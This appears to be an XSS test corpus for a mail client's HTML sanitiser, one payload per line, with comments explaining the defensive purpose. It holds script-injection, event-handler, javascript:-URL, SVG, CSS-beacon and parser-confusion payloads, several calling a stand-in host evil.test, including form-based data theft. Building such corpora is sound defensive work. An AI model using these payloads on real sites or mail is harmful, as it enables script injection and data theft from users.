# The XSS corpus. docs/06 Phase 6: "write that corpus first and commit it".
#
# One payload per line. Blank lines and lines starting with # are ignored, so a payload cannot
# begin with a hash -- none of the vectors below need to, and the alternative is an escaping
# scheme that would itself need testing.
#
# These are the shapes hostile mail actually arrives in. A mail client is the softest target
# there is for this: the attacker chooses every byte of the input, the user is expected to open
# it, and the content is rendered as markup by design. The sanitiser's allowlist is the whole
# defence, so what matters is not that these particular strings are blocked but that the
# allowlist admits nothing outside it -- these are the cases that catch an allowlist which has
# quietly grown a hole.
#
# Each is checked in tests/xss_corpus.rs against `render`, the function the reader actually
# calls, rather than against `sanitise` alone. A payload that survives image rewriting or quote
# folding would be just as dangerous as one that survives the sanitiser.

# --- script elements, in the obvious and less obvious spellings -----------------------------
<script>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<script src="https://evil.test/x.js"></script>
<script type="text/javascript">alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script/xss src="https://evil.test/x.js"></script>
<script >alert(1)</script>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<template><script>alert(1)</script></template>

# --- event handlers on otherwise permitted elements ------------------------------------------
<img src="x" onerror="alert(1)">
<img src=x onerror=alert(1)>
<img src="x" ONERROR="alert(1)">
<img src="x" onerror = "alert(1)">
<body onload="alert(1)">
<div onmouseover="alert(1)">hover</div>
<p onclick="alert(1)">click</p>
<a href="#" onfocus="alert(1)" autofocus>x</a>
<input onfocus="alert(1)" autofocus>
<svg onload="alert(1)"></svg>
<table background="javascript:alert(1)"><tr><td>x</td></tr></table>
<div style="width: expression(alert(1))">x</div>
<img src="x" onerror="&#97;lert(1)">

# --- javascript: and other executable URL schemes ---------------------------------------------
<a href="javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
<a href="java&#115;cript:alert(1)">click</a>
<a href="&#106;avascript:alert(1)">click</a>
<a href=" javascript:alert(1)">leading space</a>
<a href="vbscript:msgbox(1)">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<img src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit></form>

# --- framing, embedding and anything that loads another document ------------------------------
<iframe src="https://evil.test/"></iframe>
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
<iframe src="javascript:alert(1)"></iframe>
<object data="https://evil.test/x.swf"></object>
<embed src="https://evil.test/x.swf">
<applet code="Evil.class"></applet>
<frame src="https://evil.test/">
<frameset><frame src="https://evil.test/"></frameset>
<portal src="https://evil.test/"></portal>

# --- svg, mathml and the xml-adjacent vectors -------------------------------------------------
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml;base64,PHN2Zy8+"/></svg>
<svg><animate onbegin="alert(1)" attributeName="x"/></svg>
<svg><set onbegin="alert(1)" attributeName="x"/></svg>
<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
<math><mtext><script>alert(1)</script></mtext></math>
<math href="javascript:alert(1)"><mtext>x</mtext></math>

# --- style, link and anything that can pull or execute CSS -------------------------------------
<style>body { background: url("https://evil.test/beacon.png"); }</style>
<style>@import url("https://evil.test/x.css");</style>
<link rel="stylesheet" href="https://evil.test/x.css">
<div style="background-image: url('https://evil.test/beacon.png')">x</div>
<div style="behavior: url(#default#time2)">x</div>
<style>@font-face { src: url("https://evil.test/x.woff"); }</style>

# --- meta, base and things that change how the whole document behaves --------------------------
<meta http-equiv="refresh" content="0;url=https://evil.test/">
<base href="https://evil.test/">
<meta charset="utf-7">
<meta http-equiv="Content-Security-Policy" content="default-src *">

# --- form controls, which can exfiltrate without any script at all ------------------------------
<form action="https://evil.test/steal" method="post"><input name="x"><input type=submit></form>
<button formaction="https://evil.test/steal">x</button>
<input type="image" src="https://evil.test/beacon.png">
<isindex action="https://evil.test/steal">

# --- mutation and parser-confusion vectors ------------------------------------------------------
<div><!--<img src="--><img src=x onerror=alert(1)//">
<![CDATA[<script>alert(1)</script>]]>
<xmp><img src=x onerror=alert(1)></xmp>
<listing><img src=x onerror=alert(1)></listing>
<textarea></textarea><img src=x onerror=alert(1)>
<title></title><img src=x onerror=alert(1)>
<style></style><img src=x onerror=alert(1)>
